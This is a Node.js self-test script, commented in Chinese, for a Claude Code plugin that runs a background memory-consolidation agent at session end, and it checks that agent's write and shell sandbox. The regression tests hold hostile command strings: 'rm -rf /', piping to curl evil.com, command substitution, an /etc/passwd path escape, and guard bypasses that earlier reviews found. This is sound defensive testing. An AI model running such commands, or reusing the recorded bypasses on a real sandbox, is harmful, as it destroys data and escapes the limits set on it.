#!/usr/bin/env node
// DoD·D1：一键重跑验证。开发方自建沙箱自证跑通，不碰本仓库真实 .claude/。
// 跑法：node test/self-test.mjs
//
// 覆盖：
//  - 全链路：SessionEnd hook -> 落标记 -> 分离进程 -> 冷却判定 -> 梦 -> 报告 -> commit 拆分 -> revert -> 下次会话提示
//  - AC3 冷却期内不重复触发
//  - AC4 防递归（CLAUDE_INVOKED_BY 设置时 hook 直接 no-op）
//  - 故障注入（rogue）：越界写入确实被拒、不落盘

import { execFileSync, spawnSync } from 'node:child_process';
import { mkdtempSync, writeFileSync, readFileSync, existsSync, mkdirSync, rmSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { dreamPaths, RECURSION_GUARD_ENV, RECURSION_GUARD_VALUE } from '../src/lib/paths.mjs';
import { judgePath, judgeShell } from '../src/lib/scope-guard.mjs';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const PLUGIN_ROOT = path.join(__dirname, '..');
const SRC = path.join(PLUGIN_ROOT, 'src');

const results = [];
function check(name, cond, detail = '') {
  results.push({ name, pass: !!cond, detail });
  console.log(`${cond ? 'PASS' : 'FAIL'} - ${name}${detail ? ' :: ' + detail : ''}`);
}

function git(cwd, args) {
  return execFileSync('git', args, { cwd, encoding: 'utf8', windowsHide: true }).trim();
}

function makeSandbox(label) {
  const dir = mkdtempSync(path.join(os.tmpdir(), `claude-dream-self-test-${label}-`));
  git(dir, ['init', '-q']);
  git(dir, ['config', 'user.email', 'test@example.com']);
  git(dir, ['config', 'user.name', 'claude-dream self-test']);
  mkdirSync(path.join(dir, '.claude', 'memory'), { recursive: true });
  writeFileSync(
    path.join(dir, '.claude', 'memory', 'existing-fact.md'),
    '---\nname: existing-fact\ndescription: 沙箱预置的一条既有记忆\nmetadata:\n  type: project\n---\n\n沙箱预置内容，供测试对照，不应被占位引擎动到。\n',
    'utf8'
  );
  writeFileSync(
    path.join(dir, '.claude', 'memory', 'MEMORY.md'),
    '# Memory Index\n\n- [既有事实](existing-fact.md) — 沙箱预置\n',
    'utf8'
  );
  writeFileSync(path.join(dir, 'CLAUDE.md'), '# Sandbox Project\n\n自测沙箱，不是真实项目。\n', 'utf8');
  git(dir, ['add', '-A']);
  git(dir, ['commit', '-q', '-m', 'initial sandbox state']);
  return dir;
}

function runNode(scriptPath, args, { cwd, stdinJson, env } = {}) {
  return spawnSync(process.execPath, [scriptPath, ...(args ?? [])], {
    cwd: cwd ?? PLUGIN_ROOT,
    input: stdinJson !== undefined ? JSON.stringify(stdinJson) : '',
    encoding: 'utf8',
    env: { ...process.env, ...(env ?? {}) },
    windowsHide: true,
  });
}

async function waitFor(predicate, { timeoutMs = 120000, intervalMs = 1000 } = {}) {
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    if (await predicate()) return true;
    await new Promise((r) => setTimeout(r, intervalMs));
  }
  return false;
}

function testScopeGuardUnit() {
  console.log('\n=== scope-guard 纯函数单测（无需沙箱/SDK） ===');
  const root = process.platform === 'win32' ? 'C:\\fake-root' : '/fake-root';
  const outsideAbs = process.platform === 'win32' ? 'C:\\somewhere-else\\outside.md' : '/somewhere-else/outside.md';
  const j = (p) => path.join(root, p);

  check('允许：写 .claude/memory/ 下的文件', judgePath(j('.claude/memory/x.md'), root).allow);
  check('允许：写 .claude/dream/ 下的文件', judgePath(j('.claude/dream/x.log'), root).allow);
  check('允许：写 CLAUDE.md（阀门默认开）', judgePath(j('CLAUDE.md'), root).allow);
  check('拒绝：相对路径逃逸 ../../outside.md', !judgePath('../../outside.md', root).allow);
  check('拒绝：绝对路径直接指到项目外的另一棵树', !judgePath(outsideAbs, root).allow);
  check('拒绝：看似在白名单前缀但其实是兄弟目录 .claude/memory-evil/x.md', !judgePath(j('.claude/memory-evil/x.md'), root).allow);
  check('拒绝：项目根下白名单外的文件 README.md', !judgePath(j('README.md'), root).allow);
  check(
    '拒绝：../ 折叠后仍落在白名单外（.claude/memory/../../etc/passwd）',
    !judgePath(j('.claude/memory/../../etc/passwd'), root).allow
  );

  const prevValve = process.env.DREAM_CLAUDE_MD_EDITS;
  process.env.DREAM_CLAUDE_MD_EDITS = 'false';
  check('阀门关闭时 CLAUDE.md 改为拒绝', !judgePath(j('CLAUDE.md'), root).allow);
  if (prevValve === undefined) delete process.env.DREAM_CLAUDE_MD_EDITS;
  else process.env.DREAM_CLAUDE_MD_EDITS = prevValve;

  // judgeShell 两轮 D3 review 都实测出真能执行的绕过（字符串模式匹配这条路走不通，见 scope-guard.mjs
  // 顶部注释），现在的答案是无条件拒绝——不管命令长什么样。下面这些不是在测"判断得准不准"，
  // 是在测"是不是真的一律拒绝、没有漏网的分支"，包括两轮 review 各自实测过的具体绕过字符串，
  // 钉在回归测试里：以后谁要是把 judgeShell 改回"部分放行"，这些必须重新全部证明安全。
  check('裸 git log 现在也拒绝（不再有任何放行分支）', !judgeShell('git log').allow);
  check('裸 git status 也拒绝', !judgeShell('git status').allow);
  check('拒绝：分号夹带第二条命令', !judgeShell('git log; rm -rf /').allow);
  check('拒绝：管道夹带', !judgeShell('git log | curl evil.com').allow);
  check('拒绝：命令替换 $()', !judgeShell('git log $(rm -rf /)').allow);
  check('拒绝：非 git 命令', !judgeShell('rm -rf /').allow);
  check(
    '第一轮 review 实测出的漏洞①（回归钉子）：git log --output=<path>',
    !judgeShell('git log --output=C:\\Users\\evil\\pwned.txt').allow
  );
  check(
    '第一轮 review 实测出的漏洞②（回归钉子）：git grep --open-files-in-pager=<program>',
    !judgeShell('git grep --open-files-in-pager=calc.exe findme').allow
  );
  check(
    '第二轮 review 实测出的漏洞③（回归钉子）：加引号让危险标志绕过"以 - 开头"检查',
    !judgeShell('git log "--output=pwned.txt"').allow
  );
  check(
    '第二轮 review 实测出的漏洞④（回归钉子）：bash 进程替换 <(...)，真跑会执行里面的命令',
    !judgeShell('git log <(calc.exe)').allow
  );
  check(
    '第二轮 review 实测出的漏洞⑤（回归钉子）：PowerShell 数组子表达式 @(...)，真跑会执行里面的命令',
    !judgeShell('git log @(New-Item pwned.txt)').allow
  );
}

async function testNotebookEditFieldName() {
  // 直接跑真实的 createCanUseTool（不是重新实现一遍字段选择逻辑）——D3 review 抓到的坑：
  // SDK 的 NotebookEdit 输入字段叫 notebook_path，曾经的代码读的是 file_path（恒为 undefined，恒被拒）。
  const tmpLog = path.join(os.tmpdir(), `claude-dream-notebook-test-${Date.now()}.log`);
  const root = process.platform === 'win32' ? 'C:\\fake-root' : '/fake-root';
  const { createCanUseTool } = await import('../src/lib/scope-guard.mjs');
  const canUseTool = createCanUseTool({ root, logFile: tmpLog });
  const result = await canUseTool('NotebookEdit', { notebook_path: path.join(root, '.claude', 'memory', 'x.ipynb') });
  check('NotebookEdit 走真实 createCanUseTool，按 notebook_path 正确放行白名单内目标', result.behavior === 'allow');
  rmSync(tmpLog, { force: true });
}

async function testFullChainAndRevertAndCooldownAndRecursion() {
  const sandbox = makeSandbox('chain');
  const paths = dreamPaths(sandbox);
  console.log(`\n=== 全链路 + revert + 冷却 + 防递归（沙箱: ${sandbox}） ===`);

  // 1) 防递归：CLAUDE_INVOKED_BY 已设置时，hook 必须直接 no-op，不落标记、不拉梦。
  runNode(path.join(SRC, 'session-end.mjs'), [], {
    cwd: sandbox,
    stdinJson: { cwd: sandbox },
    env: { [RECURSION_GUARD_ENV]: RECURSION_GUARD_VALUE },
  });
  check('AC4 防递归：设了 CLAUDE_INVOKED_BY 时不落触发标记', !existsSync(paths.sessionEndMarker));

  // 2) 正常 SessionEnd：应落标记、detached 拉起分离进程、最终跑完一场梦。
  const before = Date.now();
  const sessionEndRun = runNode(path.join(SRC, 'session-end.mjs'), [], { cwd: sandbox, stdinJson: { cwd: sandbox } });
  check('SessionEnd hook 本身快速退出（不等梦跑完）', sessionEndRun.status === 0);
  check('AC2 触发标记已落盘', existsSync(paths.sessionEndMarker));

  const dreamDone = await waitFor(() => {
    if (!existsSync(paths.lastDreamState)) return false;
    const state = JSON.parse(readFileSync(paths.lastDreamState, 'utf8'));
    return state.status && state.status !== 'running' && new Date(state.lastDreamAt).getTime() >= before;
  });
  check('分离进程确实跑完一场梦（last-dream.json 落地 completed/failed）', dreamDone);

  const lastState = existsSync(paths.lastDreamState) ? JSON.parse(readFileSync(paths.lastDreamState, 'utf8')) : null;
  check('梦跑完状态是 completed（不是 failed）', lastState?.status === 'completed', JSON.stringify(lastState?.summary?.sdkError ?? ''));

  const runId = lastState?.summary?.runId;
  const placeholderPath = runId ? path.join(sandbox, '.claude', 'memory', `dream-placeholder-${runId}.md`) : null;
  check('PBI-04.3·AC1 占位整合：新记忆文件确实落盘', runId && existsSync(placeholderPath));

  const memoryIndex = existsSync(paths.memoryIndex) ? readFileSync(paths.memoryIndex, 'utf8') : '';
  check('MEMORY.md 索引行已回补指向新文件', runId && memoryIndex.includes(`dream-placeholder-${runId}`));
  check('MEMORY.md 未被写入正文内容（仍保持纯指针索引，行数受控）', memoryIndex.split('\n').length < 20, `实际行数=${memoryIndex.split('\n').length}`);

  // DoD·D2：不破坏官方 auto-memory 契约——一记一文件，且新记忆文件本身要有规范 frontmatter。
  if (placeholderPath && existsSync(placeholderPath)) {
    const placeholderContent = readFileSync(placeholderPath, 'utf8');
    const hasFrontmatter = /^---\r?\nname: [\s\S]+?\r?\ndescription: [\s\S]+?metadata:\r?\n\s+type: \w+\r?\n---/.test(placeholderContent);
    check('DoD·D2 新记忆文件带规范 frontmatter（name/description/metadata.type）', hasFrontmatter, placeholderContent.slice(0, 200));
  }
  check('DoD·D2 既有记忆文件未被占位引擎动过', existsSync(path.join(sandbox, '.claude', 'memory', 'existing-fact.md')));
  if (existsSync(path.join(sandbox, '.claude', 'memory', 'existing-fact.md'))) {
    const existingContent = readFileSync(path.join(sandbox, '.claude', 'memory', 'existing-fact.md'), 'utf8');
    check('既有记忆内容原样未改', existingContent.includes('沙箱预置内容，供测试对照，不应被占位引擎动到。'));
  }

  const reportPath = runId ? path.join(sandbox, '.claude', 'dream', `${runId}-report.md`) : null;
  check('PBI-04.3·AC2 梦报告已落盘', runId && existsSync(reportPath));
  if (reportPath && existsSync(reportPath)) {
    const report = readFileSync(reportPath, 'utf8');
    const sixSections = ['图 delta 对账', '30 秒版', '明细', '隔离观察区', '抽查点', '阀门状态'];
    check('梦报告六节骨架齐全', sixSections.every((s) => report.includes(s)), sixSections.filter((s) => !report.includes(s)).join(','));
  }

  const logPath = runId ? path.join(sandbox, '.claude', 'dream', `${runId}-canUseTool.log`) : null;
  check('PBI-04.2·AC2 canUseTool 裁决日志已落盘', runId && existsSync(logPath));
  let invocations = [];
  if (logPath && existsSync(logPath)) {
    invocations = readFileSync(logPath, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l));
  }
  check('canUseTool 确实被调用过（至少一次裁决记录）', invocations.length > 0, `count=${invocations.length}`);
  check('至少一次 allow（占位记忆的 Write 落盘）', invocations.some((i) => i.decision === 'allow'));

  const log = git(sandbox, ['log', '--oneline']);
  check('PBI-04.3·AC3 存在 dream: 前缀提交', /\bdream: /.test(log), log);
  check('report/log 证据另笔提交（dream-evidence:），不与记忆改动混在一笔', /\bdream-evidence: /.test(log), log);
  check('commitResults 没有报 dreamError/evidenceError（正常路径应该干净）', !lastState?.summary?.commits?.dreamError && !lastState?.summary?.commits?.evidenceError);

  // D3 review 抓到的坑修复验证：last-dream.json/session-end-marker.json 是纯运行态，
  // 不该出现在任何一笔提交的树里——否则 evidence 提交会永久记录一份"这场梦还在跑"的假状态。
  const evidenceSha = lastState?.summary?.commits?.evidence;
  if (evidenceSha) {
    const showLastDream = spawnSync('git', ['show', `${evidenceSha}:.claude/dream/last-dream.json`], { cwd: sandbox, encoding: 'utf8', windowsHide: true });
    check('last-dream.json 没有被 evidence 提交收进去（应该在该提交树里查不到）', showLastDream.status !== 0);
  }
  const preSha = git(sandbox, ['log', '--oneline', '--grep=^dream-pre:', '-1', '--format=%H']);
  if (preSha) {
    const showMarkerInPre = spawnSync('git', ['show', `${preSha}:.claude/dream/session-end-marker.json`], { cwd: sandbox, encoding: 'utf8', windowsHide: true });
    check('session-end-marker.json 没有被 dream-pre 快照收进去', showMarkerInPre.status !== 0);
  }
  check('AC4 下次会话提示行载体已落盘', existsSync(paths.promptCarrier));

  // 3) revert 验证：dream: 提交应可单独撤销，且不影响 evidence 提交里的报告/日志。
  const dreamSha = git(sandbox, ['log', '--oneline', '--grep=^dream:', '-1', '--format=%H']);
  let revertOk = false;
  if (dreamSha) {
    const revertResult = spawnSync('git', ['revert', '--no-edit', dreamSha], { cwd: sandbox, encoding: 'utf8', windowsHide: true });
    revertOk = revertResult.status === 0;
  }
  check('PBI-04.3·AC3 git revert 单独回滚 dream: 提交成功', revertOk);
  check('revert 后占位记忆文件消失', runId && !existsSync(placeholderPath));
  check('revert 后报告文件依然在（证据没被一起销毁，对应 verdict C7）', runId && existsSync(reportPath));

  // 4) 冷却期验证：紧接着再触发一次 SessionEnd，默认 30 分钟冷却内不应该再跑一场梦。
  const stateBeforeSecondTrigger = readFileSync(paths.lastDreamState, 'utf8');
  runNode(path.join(SRC, 'session-end.mjs'), [], { cwd: sandbox, stdinJson: { cwd: sandbox } });
  await new Promise((r) => setTimeout(r, 3000)); // 给 detached 分离进程足够时间跑到冷却判断那一步
  const stateAfterSecondTrigger = readFileSync(paths.lastDreamState, 'utf8');
  check('AC3 冷却期内不重复触发（last-dream.json 未被再次改写）', stateBeforeSecondTrigger === stateAfterSecondTrigger);

  // 5) SessionStart 消费提示行。
  const startResult = runNode(path.join(SRC, 'session-start.mjs'), [], { cwd: sandbox, stdinJson: { cwd: sandbox } });
  check('PBI-04.3·AC4 下次会话开场输出一行提示', startResult.stdout.trim().length > 0, startResult.stdout.trim());
  check('提示行载体读一次后被消费', !existsSync(paths.promptCarrier));

  return sandbox;
}

async function testConcurrentTriggerLock() {
  // D3 review 抓到的坑：原来的"锁"是 check-then-write，靠得够近的两次 SessionEnd 能一起穿过冷却期检查、
  // 都去跑梦。这里真刀真枪触发两次几乎同时的 SessionEnd（不等第一次的 detached 子进程跑完），
  // 断言最终只有一场梦真正跑完、只留一笔 dream: 提交——不是"大概率不会撞上"，是结构上不可能同时通过。
  const sandbox = makeSandbox('concurrent');
  const paths = dreamPaths(sandbox);
  console.log(`\n=== 并发触发防重（锁），沙箱: ${sandbox} ===`);

  runNode(path.join(SRC, 'session-end.mjs'), [], { cwd: sandbox, stdinJson: { cwd: sandbox } });
  runNode(path.join(SRC, 'session-end.mjs'), [], { cwd: sandbox, stdinJson: { cwd: sandbox } });

  const settled = await waitFor(() => {
    if (!existsSync(paths.lastDreamState)) return false;
    const state = JSON.parse(readFileSync(paths.lastDreamState, 'utf8'));
    return state.status && state.status !== 'running' && !existsSync(paths.lockFile);
  });
  check('两次几乎同时的 SessionEnd 最终都落定（锁释放、状态不再是 running）', settled);

  const dreamCommitCount = (git(sandbox, ['log', '--oneline', '--grep=^dream:']).match(/^\S+ dream:/gm) ?? []).length;
  check('只有一笔 dream: 提交，不是两笔并发跑出来的两笔', dreamCommitCount === 1, `实际 ${dreamCommitCount} 笔`);

  return sandbox;
}

async function testRogue() {
  const sandbox = makeSandbox('rogue');
  console.log(`\n=== 故障注入 rogue 模式（沙箱: ${sandbox}） ===`);

  const result = runNode(path.join(SRC, 'run-dream.mjs'), ['--rogue', sandbox], { cwd: sandbox });
  check('rogue 模式跑完退出码为 0（越界被拒不算梦失败）', result.status === 0, result.stderr);

  let summary = null;
  try {
    summary = JSON.parse(result.stdout);
  } catch {
    // ignore
  }
  check('rogue 输出包含可解析的 summary', !!summary, result.stdout.slice(0, 300));

  const roguePath = path.join(sandbox, 'ROGUE-TARGET.md');
  check('①故障注入入口：越界文件确实没有落盘（围栏拦下了）', !existsSync(roguePath));
  check('summary.rogueBlocked 为 true', summary?.rogueBlocked === true);

  if (summary?.runId) {
    const logPath = path.join(sandbox, '.claude', 'dream', `${summary.runId}-canUseTool.log`);
    const invocations = existsSync(logPath)
      ? readFileSync(logPath, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l))
      : [];
    check(
      'canUseTool 日志里有一条针对 ROGUE-TARGET.md 的 deny',
      invocations.some((i) => i.decision === 'deny' && i.input?.file_path?.includes('ROGUE-TARGET.md'))
    );
  }

  return sandbox;
}

function testPluginManifestShape() {
  // D3 review 抓到的坑：hooks.json 曾经缺顶层 "hooks" 包裹键（{"SessionEnd":[...]} 而不是
  // {"hooks":{"SessionEnd":[...]}}）——那是 .claude/settings.json 的格式，不是插件 hooks.json 的格式，
  // Claude Code 的插件加载器大概率根本不认。这类 schema 错误纯手工排查容易漏，写进自证脚本才靠得住。
  console.log('\n=== 插件清单结构形状检查（对应 AC1，纯静态，不起会话） ===');

  const pluginJsonPath = path.join(PLUGIN_ROOT, '.claude-plugin', 'plugin.json');
  const hooksJsonPath = path.join(PLUGIN_ROOT, 'hooks', 'hooks.json');

  let pluginJson = null;
  try {
    pluginJson = JSON.parse(readFileSync(pluginJsonPath, 'utf8'));
  } catch {
    // leave null，下面的 check 会失败并报出来
  }
  check('plugin.json 存在且是合法 JSON', !!pluginJson);
  check('plugin.json.name 是 "claude-dream"', pluginJson?.name === 'claude-dream');

  let hooksJson = null;
  try {
    hooksJson = JSON.parse(readFileSync(hooksJsonPath, 'utf8'));
  } catch {
    // ignore
  }
  check('hooks.json 存在且是合法 JSON', !!hooksJson);
  check('hooks.json 顶层有 "hooks" 包裹键（不是裸 {"SessionEnd":[...]}）', !!hooksJson?.hooks && !hooksJson?.SessionEnd);
  for (const event of ['SessionEnd', 'SessionStart']) {
    const entries = hooksJson?.hooks?.[event];
    check(`hooks.json.hooks.${event} 是非空数组`, Array.isArray(entries) && entries.length > 0);
    const cmd = entries?.[0]?.hooks?.[0];
    check(
      `${event} 第一条 hook 的 command 用 \${CLAUDE_PLUGIN_ROOT} 引用脚本`,
      typeof cmd?.command === 'string' && cmd.command.includes('${CLAUDE_PLUGIN_ROOT}') && cmd.type === 'command'
    );
  }

  const marketplacePath = path.join(PLUGIN_ROOT, '..', '.claude-plugin', 'marketplace.json');
  if (existsSync(marketplacePath)) {
    const marketplace = JSON.parse(readFileSync(marketplacePath, 'utf8'));
    const entry = marketplace.plugins?.find((p) => p.name === 'claude-dream');
    check('marketplace.json 里的 claude-dream 条目 source 指向 ./claude-dream', entry?.source === './claude-dream');
  }
}

const sandboxes = [];
try {
  testScopeGuardUnit();
  testPluginManifestShape();
  await testNotebookEditFieldName();
  sandboxes.push(await testFullChainAndRevertAndCooldownAndRecursion());
  sandboxes.push(await testConcurrentTriggerLock());
  sandboxes.push(await testRogue());
} finally {
  const failed = results.filter((r) => !r.pass);
  console.log(`\n=== 结果：${results.length - failed.length}/${results.length} 通过 ===`);
  if (failed.length) {
    console.log('失败项:');
    for (const f of failed) console.log(`  - ${f.name}${f.detail ? ' :: ' + f.detail : ''}`);
  }
  console.log(`\n沙箱目录（失败时保留供排查，全绿可删）: ${sandboxes.join(', ')}`);
  if (!failed.length) {
    for (const s of sandboxes) rmSync(s, { recursive: true, force: true });
  }
  process.exit(failed.length ? 1 : 0);
}
